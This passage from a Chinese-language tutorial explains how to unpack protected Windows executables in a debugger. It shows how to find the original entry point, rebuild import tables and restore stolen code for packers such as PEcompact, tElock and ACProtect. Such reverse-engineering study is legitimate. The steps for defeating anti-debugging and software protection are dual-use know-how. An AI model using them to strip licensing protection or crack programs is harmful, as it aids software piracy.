处理程序安装\n0040A87C  |.  64:A1 0000000>mov eax,dword ptr fs:[0]\n0040A882  |.  50            push eax\n0040A883  |.  64:8925 00000>mov dword ptr fs:[0],esp\n0040A88A  |.  83EC 58       sub esp,0x58\n0040A88D  |.  53            push ebx                                 ;  qqspirit.0047A208\n0040A88E  |.  56            push esi                                 ;  qqspirit.0042C0C8\n0040A88F  |.  57            push edi                                 ;  qqspirit.004252AC\n0040A890  |.  8965 E8       mov [local.6],esp\n0040A893  |.  FF15 10524200 call dword ptr ds:[0x425210]             ;  kernel32.GetVersion\n```\n\n可以在importREC中填好OEP->自动查找IAT->获取输入表，验证虚拟地址为25210处是否为`GetVersion`函数。\n\n{% asset_img GetVersion.jpg GetVersion %}\n\n在OD的命令窗口输入`d 425210`回车，数据窗口会刷新数据，右键->长型->地址，程序中所有函数全都显示出来了。往上滑动记下第一个函数地址`425000`(再往上全是0)，往下滑动记下最后一个`kernel32`系列函数的下一个地址`425284`。\n\n回到importREC填入RVA`25000`，大小`425284-425000=284`(比较偷懒的做法就是将大小写成1000或1500，但会产生很多垃圾指针)，获取输入表->显示无效函数，无效函数少的话可以直接选中无效函数右键->剪切指针，转储到文件。这时的`dumped_.exe`可以正常运行了。(无效函数多的话右键->跟踪级别1或跟踪级别3跟一下，或者右键->插件跟踪)\n\n由于OllyDump是很久远的插件了，所以对现在的脱壳不太友好，最好是用③方法脱壳。而在③方法中importREC最好换成Scylla用作IAT修复，因为ImpREC对一些新系统的API支持不好。\n\nScylla用法跟importREC差不多，但是OEP要填`40A86D`，VA填`425000`，大小与importREC一样，同样操作，修复转储后文件。\n\n## 4.5 PEcompact\n\n{% asset_img PEcompact.png PEcompact %}\n\nPEcompact壳可以用单步跟踪、ESP定律、2次内存镜像法。\n\n使用单步跟踪时，与ASPacK一样都会跑飞，只需F7进入函数即可。\n\n使用ESP定律时，执行完两个`push`指令后再进行ESP。\n\n```asm\n0040A86D >  B8 74DE4500     mov eax,qqspirit.0045DE74\n0040A872    50              push eax                                 ; qqspirit.0045DE74\n0040A873    64:FF35 0000000>push dword ptr fs:[0]\n0040A87A    64:8925 0000000>mov dword ptr fs:[0],esp\n```\n\n使用2次内存镜像法时，程序跳到此处：\n\n```asm\n0045DE89    C602 E9         mov byte ptr ds:[edx],0xE9\n0045DE8C    83C2 05         add edx,0x5\n0045DE8F    2BCA            sub ecx,edx                              ; qqspirit.0040A883\n0045DE91    894A FC         mov dword ptr ds:[edx-0x4],ecx           ; qqspirit.0045DE97\n0045DE94    33C0            xor eax,eax\n0045DE96    C3              retn\n0045DE97    B8 F9CB45F0     mov eax,0xF045CBF9\n```\n\n如果执行`retn`再单步跟踪，程序跑飞。所以要在`retn`指令的下一条指令下断点运行，再单步跟踪到OEP。\n\n### 4.5.1 使用VirtualFree\n\n方法一：在命令窗口输入`bp VirtualFree`回车，运行。取消断点，Alt+F9返回到用户代码处。右键->查找->命令，输入`push 8000`(特征码)，取消勾选整个块，F4运行至此处，单步跟踪。\n\n方法二：在命令窗口输入`bp VirtualFree`回车，两次F9运行。取消断点，Alt+F9返回到用户代码处。单步跟踪。\n\n### 4.5.2 使用VirtualAlloc\n\n在命令窗口输入`bp VirtualAlloc`回车，运行。取消断点，Alt+F9返回到用户代码处。单步跟踪。\n\n### 4.5.3 使用GetVersion\n\n在命令窗口输入`at GetVersion`回车，反汇编窗口跳到相关代码处，F2->F9->F2。\n\n```asm\n7C81127A >  64:A1 18000000  mov eax,dword ptr fs:[0x18]\n7C811280    8B48 30         mov ecx,dword ptr ds:[eax+0x30]\n7C811283    8B81 B0000000   mov eax,dword ptr ds:[ecx+0xB0]\n7C811289    0FB791 AC000000 movzx edx,word ptr ds:[ecx+0xAC]\n7C811290    83F0 FE         xor eax,-0x2\n7C811293    C1E0 0E         shl eax,0xE\n7C811296    0BC2            or eax,edx                               ; ntdll.KiFastSystemCallRet\n7C811298    C1E0 08         shl eax,0x8\n7C81129B    0B81 A8000000   or eax,dword ptr ds:[ecx+0xA8]\n7C8112A1    C1E0 08         shl eax,0x8\n7C8112A4    0B81 A4000000   or eax,dword ptr ds:[ecx+0xA4]\n7C8112AA    C3              retn\n```\n\n一直单步到`retn`处返回父函数。往上滑动发现OEP，父函数就是真正代码处。\n\n### 4.5.4 最后一次异常法\n\n选项->调试设置->异常，将所有选项取消勾选。插件->StrongOD->skip some exceptions取消勾选。重新载入，按Shift+F9几次，直至出现主程序。\n\n比如在ximo教程中是按了Shift+F9两次后跑飞，所以可知主程序在第一次Shift+F9到第二次Shift+F9的代码之间。重新载入，去到倒数第二次的Shift+F9处，在堆栈窗口查看标有`SE处理程序`(一般是第二行)的数值`0045DE74`，在反汇编窗口Ctrl+G查找`0045DE74`，下断点，Shift+F9运行，取消断点。这就来到了与2次镜像内存法一样的地址处，单步跟踪，也要绕过`retn`指令。\n\n### 4.5.5 PEcompact的第一条指令\n\n```asm\n0040A86D >  B8 74DE4500     mov eax,qqspirit.0045DE74\n```\n\n加壳程序的第一条指令就是将偏移地址`0045DE74`赋值给eax。在命令窗口输入`bp 0045DE74`回车->运行->取消断点。后面步骤与2次镜像内存法一样的地址处，单步跟踪，也要绕过`retn`指令。\n\n## 4.6 EZIP\n\n这个可以用单步跟踪和ESP定律。这次主要讲脱壳后程序崩溃问题。用③方法脱壳没有问题，而用①和②方法都出现了找不到dll的问题。\n\n{% asset_img 没有找到dll.png 没有找到dll %}\n\n此时，只要打开LoadPE分别将`oddump1.exe`和`oddump2.exe`重建PE即可。\n\n## 4.7 tElock 0.98b1\n\n这个壳可以用最后一次异常法、模拟跟踪法、2次内存镜像法。\n\n这个程序中很多的花指令以及SEH暗桩。\n\n花指令是，由设计者特别构思，希望使反汇编的时候出错，让破解者无法清楚正确地反汇编程序的内容，迷失方向。经典的是，目标位置是另一条指令的中间，这样在反汇编的时候便会出现混乱。花指令有可能利用各种指令：jmp, call, ret的一些堆栈技巧，位置运算，等等。\n\n花指令是程序中的无用代码，程序对它没影响，少了它也能正常运行。加花指令后，杀毒软件对木马静态反汇编时，木马的代码就不会正常显示出来，加大杀毒软件的查杀难度。\n\nSEH，结构化异常处理，是WINDOWS中异常处理的机制，简单地说，就是操作系统维护一个用来处理异常的函数指针的链表，如果发生异常，系统就会顺着这个链表去调用其中的函数，直到某个异常处理函数将异常处理完了，或者所有的函数都不处理异常。\n\n使用SEH的机制来进制反调试，就是SEH暗桩。\n\n程序可以将特定的代码注册成为异常处理函数，然后故意产生一些异常。当程序被调试时，所有的异常事件，都会先发由调试器进行处理，调试器可以决定是否处理，以及如何处理；如果调试器决定不处理，程序自己注册的异常处理入口才会得到执行。对于调试器，并不能保证所有的异常都正确的识别并恰当地处理（因此OD中的很多插件都有anti-anti功能），如果因为调试器对异常情况识别有误，那么程序就会执行完全不同的一条执行路径，这样程序就可以知道自己正在被调试了。\n\n### 4.7.1 最后一次异常法\n\n选项->调试设置->异常，将所有选项取消勾选。插件->StrongOD->skip some exceptions取消勾选。重新载入，按17次Shift+F9出现主程序。\n\n重载，按16次Shift+F9后，观察堆栈窗口的`SE处理程序`数值为0042D7FD。在反汇编窗口下断点Shift+F9运行，取消断点。之后用单步跟踪。\n\n### 4.7.2 模拟跟踪法\n\n使用模拟跟踪法的前提是没有SEH暗桩。而这个程序有很多SEH暗桩。我们知道，按16次Shift+F9没有出现主程序，而在第17次出现主程序，所以第16次到第17次的这一段是没有SEH暗桩的。所以连续按16次Shift+F9再使用模拟跟踪法。\n\n### 4.7.3 2次内存镜像法\n\n2次内存镜像法即可到达OEP。\n\n用①方法脱壳出现问题：\n\n{% asset_img 无法定位程序输入点于动态库.png 无法定位程序输入点于动态库 %}\n\n可以用importREC修复。打开原加壳程序(因为用OD进程会卡死)，填好OEP->自动查找IAT->获取输入表，显示无效函数，发现有非常多的无效函数，选中右键->插件跟踪->tElock 0.98，让它自动修复无效函数，修复完后还有5个无效函数，右键->剪切指针。转储到文件，程序正常运行。\n\n用②③方法直接崩溃不出现弹窗。用importREC进行上述修复后同样可以正常运行。\n\n## 4.8 exe32pack\n\n可以用ESP定律。\n\n### 4.8.1 使用IsDebuggerPresent\n\n在命令窗口输入`bp IsDebuggerPresent`回车，运行。取消断点，Alt+F9返回到用户代码处。\n\n```asm\n0040ED24    8BBD 013C4000   mov edi,dword ptr ss:[ebp+0x403C01]\n0040ED2A    03BD 273C4000   add edi,dword ptr ss:[ebp+0x403C27]      ; sticker.00400000\n```\n\nF8执行到下一条指令，查看信息窗口：\n\n```asm\nss:[0040A167]=00400000 (sticker.00400000), ASCII \"MZ0\"\nedi=0000535F\n```\n\n基址为`400000`，偏移地址为`535F`，第二条指令就是要它俩相加，结果就是OEP=40535F\n\nCtrl+G去到40535F，F4运行至光标处，光标处即OEP。 \n\n## 4.9 WinUpack\n\n用单步跟踪法跟踪到这一步，发现这是个大跳转，然而这个跳转却没有实现。\n\n```asm\n0043E635  - 0F84 E3BDFCFF   je 跑跑排行.0040A41E\n```\n\n不能直接改为jmp，因为如果这样改的话在Scylla获取输入表时一个函数都没有。\n\n要让这个跳转实现，即eax要等于0。\n\n```asm\n0043E633    85C0            test eax,eax                             ; 跑跑排行.0040C034\n0043E635  - 0F84 E3BDFCFF   je 跑跑排行.0040A41E\n```\n\n运行到跳转指令处，右键->断点->条件，输入`eax==0`。F9运行，取消断点，F8跳转至OEP。之后用③方法dump即可。\n\n## 4.10 脱壳的基本思路及小结\n\n还有非常多的我们没见过的壳，比如KByS、RLPack、PEpack、JDPack、PEncrypt等。但基本都可以用以下几种办法解决：\n\n1. 单步跟踪\n2. ESP定律\n3. 2次内存镜像\n4. 最后一次异常法\n5. 模拟跟踪法\n6. SFX模拟跟踪\n\n压缩壳修不修正无所谓，但加密壳一定要修正镜像大小。\n\n如果脱壳后的程序无法运行，可能是IAT重定位的问题，无效指针的问题，需要重建PE的问题，包括5的疑难杂症等等。这需要慢慢探索吧。\n\n## 4.11 ASPack变形壳\n\n使用单步跟踪法、2次内存镜像法可以，但ESP定律不行。\n\n另外，对任何壳，短距离call要跟进去，远距离call可以不跟进去。\n\n### 4.11.1 利用脚本进行脱壳\n\n载入加壳程序后，插件->ODdgScript->运行脚本->打开对应的壳脚本(后缀可以为txt/osc)，自动找到程序OEP。\n\n脱壳脚本要自己收集，如果遇到一些变形壳，脱壳脚本可能就太不管用了，在运行了脱壳脚本的基础上再单步跟踪到OEP。\n\n## 4.12 ACProtect\n\n### 4.12.1 ACProtect 1.32\n\nACProtect 1.32是没有Stolen Code的，脱壳相对简单。\n\nStolen Code的意思是把被保护程序要运行的代码移走，以进行进一步的保护处理。增加分析难度，脱壳难度、增加反跟踪难度等等。 \n\n{% asset_img ACProtect132.png ACProtect1.32 %}\n\n运行一下程序，发现会弹一个ACProtect壳的NAG窗口，再进入到主程序。\n\n载入OD，选项->调试设置->异常->将非法访问内存取消勾选，插件->SrtongOD->options->将skip some exceptions取消勾选。用最后一次异常法，发现它在第2次Shift+F9跑飞了。所以在第1次Shift+F9(如果第一次就跑飞的话用F9)后，选中堆栈窗口的`SE处理程序`右键->数据窗口中跟随，在数据窗口中的第一个字节下一个内存访问断点，Shift+F9运行。在反汇编窗口下断点，Shift+F9，再次下断点，Shift+F9。在`B`模块取消软件断点。如何删除内存访问断点呢？直接右键->断点->删除内存断点即可。去到`M`模块，选中程序领空的`.text`区段右键->在访问上设置中断，Shift+F9，弹出NAG窗口，点确定后直达OEP。\n\n用importREC修复IAT，Scylla会加载出非常多无效指针。\n\n### 4.12.2 Ultraprotect 1.x(stolen code)\n\n查壳显示Ultraprotect壳，这是ACProtect以前的名字，EP区段都显示`.perplex`。\n\n这次运行没有NAG窗口。与上述操作一致，到达“OEP”。\n\n```asm\n004010D2    56              push esi\n004010D3    FF15 E4634000   call dword ptr ds:[0x4063E4]             ; notepad9.0040D1BA\n```\n\n这“OEP”长得非常奇怪，与我们之前遇到的语言入口特征都不一样。考虑到ACProtect会有偷代码的习惯，所以猜测入口特征被移到了某处。\n\n入口特征最常见的是`push ebp`，先用这个试一下。\n\n同样，删除完3个断点后，F4运行至目前函数的`retn`处。调试->设置条件(Ctrl+T)，勾选“命令是一个”，在输入框填写“push ebp”。调试->跟踪步入(Ctrl+F11)，跟踪需要亿点时间，跟踪完后会跳到某个指令处，刚好就是被偷的入口特征代码。\n\n```asm\n004254C9    55              push ebp\n004254CA    8BEC            mov ebp,esp\n004254CC    83EC 44         sub esp,0x44\n004254CF    60              pushad\n004254D0    60              pushad\n```\n\n后面几个是出栈指令，所以被偷的代码应该是前3条。选中右键->二进制->二进制复制。同样在`M`模块的`.text`下断点，Shift+F9运行至“OEP”。由于前3条指令占6个字节，所以要粘贴在“OEP”前6个字节处(粘贴前要把粘贴的地方的指令先nop掉)。覆盖后代码如下：\n\n```asm\n004010CA    90              nop\n004010CB    90              nop\n004010CC    55              push ebp\n004010CD    8BEC            mov ebp,esp\n004010CF    83EC 44         sub esp,0x44\n004010D2    56              push esi\n```\n\n选中真正的OEP右键->此处为新EIP。接下来就是脱壳了。如果遇到很多无效函数，可以用插件跟踪->ACProtect，也可以用跟踪级别跟踪(注意OD进程跟踪会卡死，所以打开加壳程序跟踪)。\n\n### 4.12.3 Ultraprotect 1.x进阶版\n\n用4.12.2的方法到了跟踪那一步会报错，“无法处理调试异常”。这时，将选项->调试设置->异常->将INT3中断取消勾选，其余勾选。重载，同样用最后一次异常法，取消3个断点后，在命令窗口输入`d 12ffc0`回车，下硬件访问断点，Shift+F9。程序找到Stolen Code。\n\n```asm\n004C9B30    61              popad\n004C9B31    55              push ebp\n004C9B32    8BEC            mov ebp,esp\n004C9B34    6A FF           push -0x1\n```\n\n复制，找到“OEP”往上滑，却发现代码全乱了。\n\n```asm\n004431F9    68 D8B24400     push NetClean.0044B2D8\n004431FE    68 B4334400     push NetClean.004433B4\n```\n\n```asm\n004431F7   /2e:79 68        bhnt jns short 00443262\n004431FA   |D8B2 440068B4   fdiv dword ptr ds:[edx-0x4B97FFBC]\n00443200   |334400 64       xor eax,dword ptr ds:[eax+eax+0x64]\n```\n\n去一下别的模块再回来，发现又好了，就是不能向上滑动。右键->分析->分析代码。这时往上滑正常。将被偷的代码粘贴上去，修改EIP。\n\n脱壳，运行程序异常。这是因为某些ACProtect 1.x壳有自我保护功能，即入口点如果不是原本那个地址可能就运行不了了。加壳程序入口点`4AC000`。将已脱壳程序载入OD，定位到`4AC000`，将被偷代码粘贴，再跳到OEP。\n\n```asm\n004AC000    55              push ebp\n004AC001    8BEC            mov ebp,esp\n004AC003    6A FF           push -0x1\n004AC005  - E9 EA71B9FF     jmp 004431F4\n;jmp 4431F4也可改为push 4431F4, retn\n```\n\n复制到可执行文件。再用LoadPE编辑入口点为`AC000`，程序正常执行。\n\n### 4.12.4 ACProtect 2.0.x\n\n#### 4.12.4.1 VB类\n\n用4.12.1方法直接到达“OEP”`4012CE`。\n\n```asm\n004012CE  - FF25 78104000   jmp dword ptr ds:[0x401078]              ; msvbvm60.ThunRTMain\n004012D4    29BA A821B144   sub dword ptr ds:[edx+0x44B121A8],edi\n004012DA    BC 4DB59200     mov esp,0x92B54D\n004012DF    0000            add byte ptr ds:[eax],al\n004012E1    0000            add byte ptr ds:[eax],al\n```\n\n根据语言的编译特点，发现它是VB程序。以下就是VB程序的典型例子。第一条指令`push`，第二条指令`call`，双击call指令就可知道call的地址`call 00401044`，刚好是OEP的上面一条`jmp 系统函数`指令。运行到这条jmp指令时，堆栈窗口的第二条就是push的地址。\n\n```asm\n00401044   $- FF25 18104000 jmp dword ptr ds:[<&MSVBVM60.#ThunRTMain_100>]     ;  msvbvm60.ThunRTMain\n0040104A   ?  0000          add byte ptr ds:[eax],al\n0040104C > $  68 3C1F4000   push 吾爱破解.00401F3C                                 ;  ASCII \"VB5!\u001c#vb6chs.dll\"\t\tOEP\n00401051   .  E8 EEFFFFFF   call <jmp.&MSVBVM60.#ThunRTMain_100>\n```\n\n```asm\n0012FFBC   00401056  返回到 吾爱破解.00401056 来自 <jmp.&MSVBVM60.#ThunRTMain_100>\n0012FFC0   00401F3C  ASCII \"VB5!\u001c#vb6chs.dll\"\n```\n\n模仿典型例子修改代码：\n\n```asm\n004012CE  - FF25 78104000   jmp dword ptr ds:[0x401078]              ; msvbvm60.ThunRTMain\n004012D4    68 54474000     push QQ个性签.00404754\n004012D9    E8 F0FFFFFF     call QQ个性签.004012CE                      ; jmp 到 msvbvm60.ThunRTMain\n```\n\n在真正OEP`4012D4`处右键->此处为新EIP，脱壳。\n\n#### 4.12.4.2 Delphi\n\n这次的壳发现取消勾选“非内存访问”或“INT3”或两个都取消，都直接跑飞。换方法。\n\n在命令窗口输入`bp GetCurrentProcessId`回车，运行，取消断点。用LoadPE查看程序的PID为`8C8`(每次都会变)。\n\n```asm\n7C8099C0 >  64:A1 18000000  mov eax,dword ptr fs:[0x18]\n7C8099C6    8B40 20         mov eax,dword ptr ds:[eax+0x20]          ; comctl_1.<ModuleEntryPoint>\n7C8099C9    C3              retn\n```\n\n修改为：\n\n```asm\n7C8099C0 >  B8 64050000     mov eax,0x564\n7C8099C5    90              nop\n7C8099C6    90              nop\n7C8099C7    90              nop\n7C8099C8    90              nop\n7C8099C9    C3              retn\n```\n\n光标处修改为PID，下面指令都nop掉。\n\n在命令窗口输入`bp GetModuleHandleA`回车，运行，取消断点。去到`M`模块，在CODE设置访问中断(F2)，F9运行，出现NAG窗口，点确定后，来到OEP。\n\n### 4.12.5 另类方法解ACProtect\n\nACProtect 1.4x\n\n取消勾选“非法内存访问”和“int3中断”都跑飞。用4.12.4.2方法找到“OEP”。用4.12.2寻找Stolen Code跟踪时间太过漫长，可以用另一种办法。\n\n```asm\n0040A54C    50              push eax                                 ; 跑跑排行.00400000\n0040A54D    E8 1B030000     call 跑跑排行.0040A86D\n0040A552    8945 98         mov dword ptr ss:[ebp-0x68],eax          ; 跑跑排行.00400000\n```\n\n重载，看到有`pushad`，试一下用ESP定律，硬件断点先别删除，再用最后一次异常法。Shift+F9连续13次到达最佳脱壳地点。\n\n```asm\n00441E4D    64:A1 00000000  mov eax,dword ptr fs:[0]\n00441E53    8905 39CA4200   mov dword ptr ds:[0x42CA39],eax\n00441E59    FF35 39CA4200   push dword ptr ds:[0x42CA39]\n```\n\n但是脱壳却说这个位置没有函数。在importREC先填写OEP为`A54C`，获取输入表修复IAT后，再将OEP改为`41E4D`，转储到文件。\n\n程序正常运行，查壳说还有壳，但已经可以进行破解美化DIY了。\n\n### 4.12.6 补区段\n\nACProtect壳会对`MessageBoxA`和`ReigisterHotKey`进行处理，所以我们要在它进行处理的地方nop掉不让它处理。\n\n将所有忽略异常勾选，在`M`模块的`.rdata`处下断运行(没有`.rdata`用`.idata`)。单步跟踪看注释窗口出现这两个API函数，把它下面的跳转指令nop掉。\n\n```asm\n0043396D    3B85 9CE24100   cmp eax,dword ptr ss:[ebp+0x41E29C]      ; user32.MessageBoxA\n00433973    74 20           je short NgaMy.00433995;nop\n00433975    90              nop\n00433976    90              nop\n00433977    90              nop\n00433978    90              nop\n00433979    3B85 9D014100   cmp eax,dword ptr ss:[ebp+0x41019D]      ; user32.RegisterHotKey\n0043397F    74 09           je short NgaMy.0043398A;nop\n```\n\n再继续往下有magic跳，改JMP。\n\n```asm\n004339C0    80BD D2594100 0>cmp byte ptr ss:[ebp+0x4159D2],0x0\n004339C7    74 57           je short NgaMy.00433A20;jmp\n```\n\n在`M`模块的`.text`下访问中断，Shift+F9运行到此处。\n\n```asm\n00403D38    68 8C3D4000     push NgaMy.00403D8C\n00403D3D    64:A1 00000000  mov eax,dword ptr fs:[0]\n00403D43    50              push eax\n00403D44    8B4424 10       mov eax,dword ptr ss:[esp+0x10]\n00403D48    896C24 10       mov dword ptr ss:[esp+0x10],ebp\n00403D4C    8D6C24 10       lea ebp,dword ptr ss:[esp+0x10]\n00403D50    2BE0            sub esp,eax\n00403D52    53              push ebx\n00403D53    56              push esi\n00403D54    57              push edi\n00403D55    8B45 F8         mov eax,dword ptr ss:[ebp-0x8]           ; kernel32.7C817080\n00403D58    8965 E8         mov dword ptr ss:[ebp-0x18],esp\n00403D5B    50              push eax\n00403D5C    8B45 FC         mov eax,dword ptr ss:[ebp-0x4]\n00403D5F    C745 FC FFFFFFF>mov dword ptr ss:[ebp-0x4],-0x1\n00403D66    8945 F8         mov dword ptr ss:[ebp-0x8],eax\n00403D69    8D45 F0         lea eax,dword ptr ss:[ebp-0x10]\n00403D6C    64:A3 00000000  mov dword ptr fs:[0],eax\n00403D72    C3              retn\n```\n\nF4去到`retn`处，F8返回父函数。再去到`M`模块`.text`设置内存访问断点运行，F4去到`retn`处，F8返回父函数。再去到`M`模块`.text`设置内存访问断点运行，F4去到`retn`处，F8返回父函数。到达“OEP”。\n\n```asm\n0040305C    83F9 02         cmp ecx,0x2\n0040305F    74 0C           je short NgaMy.0040306D\n00403061    81CE 00800000   or esi,0x8000\n00403067    8935 B0DE4000   mov dword ptr ds:[0x40DEB0],esi\n```\n\n用Scylla脱壳(因为用PEtools和LoadPE脱都显示错误)，在importREC输入偏移地址，自动获取输入表没有函数，自己手动查找IAT，起始地址A000，大小174。\n\n下一步，加壳程序重载，用ESP定律。F9运行5次来到这里：\n\n```asm\n004365F4    8915 F5FD4100   mov dword ptr ds:[0x41FDF5],edx          ; ntdll.KiFastSystemCallRet\n004365FA    FF35 F5FD4100   push dword ptr ds:[0x41FDF5]\n00436600    8F05 2DFE4100   pop dword ptr ds:[0x41FE2D]              ; kernel32.7C817077\n00436606    FF35 2DFE4100   push dword ptr ds:[0x41FE2D]\n0043660C    C70424 60000000 mov dword ptr ss:[esp],0x60\n00436613    56              push esi\n00436614    890C24          mov dword ptr ss:[esp],ecx\n00436617    68 8DFD4100     push NgaMy.0041FD8D\n0043661C    59              pop ecx                                  ; kernel32.7C817077\n0043661D    8919            mov dword ptr ds:[ecx],ebx\n0043661F    8B0C24          mov ecx,dword ptr ss:[esp]               ; kernel32.7C817077\n00436622    8F05 ADFE4100   pop dword ptr ds:[0x41FEAD]              ; kernel32.7C817077\n00436628    FF35 8DFD4100   push dword ptr ds:[0x41FD8D]\n0043662E    C70424 48A24000 mov dword ptr ss:[esp],NgaMy.0040A248\n00436635    8905 B9FD4100   mov dword ptr ds:[0x41FDB9],eax\n0043663B    FF35 B9FD4100   push dword ptr ds:[0x41FDB9]\n00436641    90              nop\n00436642    90              nop\n00436643    60              pushad\n00436644    E8 01000000     call NgaMy.0043664A\n```\n\n将`pushad`前的代码二进制复制下来：\n\n```asm\n89 15 F5 FD 41 00 FF 35 F5 FD 41 00 8F 05 2D FE 41 00 FF 35 2D FE 41 00 C7 04 24 60 00 00 00 56\n89 0C 24 68 8D FD 41 00 59 89 19 8B 0C 24 8F 05 AD FE 41 00 FF 35 8D FD 41 00 C7 04 24 48 A2 40\n00 89 05 B9 FD 41 00 FF 35 B9 FD 41 00\n```\n\n取消硬件断点，F4去到`pushad`的下一条指令，在寄存器窗口找ESP，继续用ESP定律。\n\n```asm\n00436F16    68 1DFD4100     push NgaMy.0041FD1D\n00436F1B    58              pop eax\n00436F1C    8930            mov dword ptr ds:[eax],esi               ; NgaMy.00403D38\n00436F1E    8F05 79FC4100   pop dword ptr ds:[0x41FC79]\n00436F24    8B05 79FC4100   mov eax,dword ptr ds:[0x41FC79]\n00436F2A    FF35 1DFD4100   push dword ptr ds:[0x41FD1D]\n00436F30    56              push esi                                 ; NgaMy.00403D38\n00436F31    891C24          mov dword ptr ss:[esp],ebx\n00436F34    C70424 383D4000 mov dword ptr ss:[esp],NgaMy.00403D38\n00436F3B    8B3424          mov esi,dword ptr ss:[esp]\n00436F3E    8F05 A5FE4100   pop dword ptr ds:[0x41FEA5]              ; NgaMy.00403D38\n00436F44    8905 01FF4100   mov dword ptr ds:[0x41FF01],eax\n00436F4A    FF35 01FF4100   push dword ptr ds:[0x41FF01]\n00436F50    891C24          mov dword ptr ss:[esp],ebx\n00436F53    56              push esi                                 ; NgaMy.00403D38\n00436F54    C70424 45FE4100 mov dword ptr ss:[esp],NgaMy.0041FE45\n00436F5B    8F05 31FE4100   pop dword ptr ds:[0x41FE31]              ; NgaMy.0041FE45\n00436F61    90              nop\n00436F62    90              nop\n00436F63    60              pushad\n00436F64    E8 01000000     call NgaMy.00436F6A\n```\n\n```asm\n68 1D FD 41 00 58 89 30 8F 05 79 FC 41 00 8B 05 79 FC 41 00 FF 35 1D FD 41 00 56 89 1C 24 C7 04\n24 38 3D 40 00 8B 34 24 8F 05 A5 FE 41 00 89 05 01 FF 41 00 FF 35 01 FF 41 00 89 1C 24 56 C7 04\n24 45 FE 41 00 8F 05 31 FE 41 00\n```\n\n重复操作n次，到达OEP。\n\nESP有：12FFA4、12FF98、12FF94、12FF24、12FF1C、12FF20、12FF1C、12FF1C、12FE8C、12FE8C、12FE90。\n\n在12FE90处下断点后运行到达jmp指令，F8去到一个大跳转，跳到“OEP”。\n\n```asm\n0043BE77   /EB 01               jmp short NgaMy.0043BE7A  \n```\n\n```asm\n0043BE7A  - FF25 BCBE4300   jmp dword ptr ds:[0x43BEBC]              ; NgaMy.0040305C\n```\n\n```asm\n0040305C    83F9 02         cmp ecx,0x2\n0040305F    74 0C           je short NgaMy.0040306D\n```\n\n二进制代码汇总：\n\n```asm\n89 15 F5 FD 41 00 FF 35 F5 FD 41 00 8F 05 2D FE 41 00 FF 35 2D FE 41 00 C7 04 24 60 00 00 00 56\n89 0C 24 68 8D FD 41 00 59 89 19 8B 0C 24 8F 05 AD FE 41 00 FF 35 8D FD 41 00 C7 04 24 48 A2 40\n00 89 05 B9 FD 41 00 FF 35 B9 FD 41 00 68 1D FD 41 00 58 89 30 8F 05 79 FC 41 00 8B 05 79 FC 41 \n00 FF 35 1D FD 41 00 56 89 1C 24 C7 04 24 38 3D 40 00 8B 34 24 8F 05 A5 FE 41 00 89 05 01 FF 41 \n00 FF 35 01 FF 41 00 89 1C 24 56 C7 04 24 45 FE 41 00 8F 05 31 FE 41 00 8B 1D 31 FE 41 00 89 33 \n8F 05 39 FC 41 00 FF 35 39 FC 41 00 5B 8F 05 09 FE 41 00 89 1D 21 FC 41 00 FF 35 21 FC 41 00 C7 \n05 19 FC 41 00 09 FE 41 00 8B 1D 19 FC 41 00 8B 33 8F 05 FD FB 41 00 8B 1D FD FB 41 00 FF 15 45 \nFE 41 00 89 0D B1 FD 41 00 FF 35 B1 FD 41 00 8F 05 B5 FC 41 00 FF 35 B5 FC 41 00 56 BE FD FC 41 \n00 89 3E 5E FF 35 FD FC 41 00 68 94 00 00 00 8F 05 E5 FC 41 00 FF 35 E5 FC 41 00 5F 89 3D 3D FE \n41 00 FF 35 3D FE 41 00 8B 0C 24 8F 05 7D FE 41 00 8B 3C 24 8F 05 79 FD 41 00 89 35 25 FC 41 00 \nFF 35 25 FC 41 00 89 0C 24 8B 3C 24 8F 05 B9 FC 41 00 8F 05 19 FE 41 00 89 05 89 FD 41 00 FF 35 \n89 FD 41 00 57 BF 19 FE 41 00 8B C7 5F 8B 08 8F 05 95 FC 41 00 8B 05 95 FC 41 00 53 8F 05 5D FE \n41 00 FF 35 5D FE 41 00 89 0C 24 89 3D 91 FE 41 00 FF 35 91 FE 41 00 8F 05 81 FC 41 00 89 1D 89 \nFE 41 00 FF 35 89 FE 41 00 68 81 FC 41 00 5B 8B 0B 8F 05 C9 FC 41 00 8B 1D C9 FC 41 00 57 89 04 \n24 89 0C 24 8B 04 24 8F 05 D5 FD 41 00 8B 0C 24 8F 05 4D FC 41 00 50 89 14 24 8F 05 BD FE 41 00 \nFF 35 BD FE 41 00 51 B9 DD FD 41 00 89 39 59 FF 35 DD FD 41 00 C7 05 A9 FE 41 00 60 55 40 00 FF \n35 A9 FE 41 00 8B 3C 24 8F 05 95 FD 41 00 89 1D 29 FD 41 00 FF 35 29 FD 41 00 8B DF 8B D3 5B 8F \n05 E9 FE 41 00 8B 3D E9 FE 41 00 52 89 1C 24 68 9D FE 41 00 5B 89 13 8B 1C 24 8F 05 49 FE 41 00 \n8B 14 24 8F 05 69 FD 41 00 FF 15 9D FE 41 00 89 65 E8 89 25 C5 FD 41 00 89 1D 21 FD 41 00 FF 35 \n21 FD 41 00 68 C5 FD 41 00 5B 8B 33 8B 1C 24 8F 05 A9 FC 41 00 89 3E 57 8F 05 F5 FE 41 00 FF 35 \nF5 FE 41 00 89 34 24 FF 15 BC A0 40 00 8B 4E 10 50 B8 F9 FB 41 00 89 10 58 FF 35 F9 FB 41 00 56 \nC7 04 24 AC DE 40 00 8B 14 24 8F 05 AD FD 41 00 89 0A 8F 05 29 FE 41 00 FF 35 29 FE 41 00 5A 8B \n46 04 A3 B8 DE 40 00 8B 56 08 52 8F 05 3D FD 41 00 FF 35 3D FD 41 00 8F 05 BC DE 40 00 8B 76 0C \n81 E6 FF 7F 00 00 53 BB 35 FE 41 00 89 33 5B FF 35 35 FE 41 00 8F 05 B0 DE 40 00\n```\n\n用topo工具在脱壳修复后的程序申请一个新的区段，数以上字节数或直接输入1000，记下起始的地址：0043E000。OD打开脱完壳后的程序，找到0043E000，粘贴入代码，记住，后面得加跳向假OEP的代码！！保存。\n\n```asm\nJMP 0040305C \n```\n\n用LoadPE修正入口点为3E000。\n\n### 4.12.7 AC脱壳出现的问题\n\n1. **用LoadPE无法抓取进程内存**。用Scylla填入OEP，获取输入表，不用管无效函数，转储到文件。再用importREC或Scylla重建IAT。\n2. **用importREC填入OEP无法获取输入表**。用Scylla重建IAT，但剪切指针时可能麻烦一点。\n\n## 4.13 ASProtect\n\n### 4.13.1 ASProtect 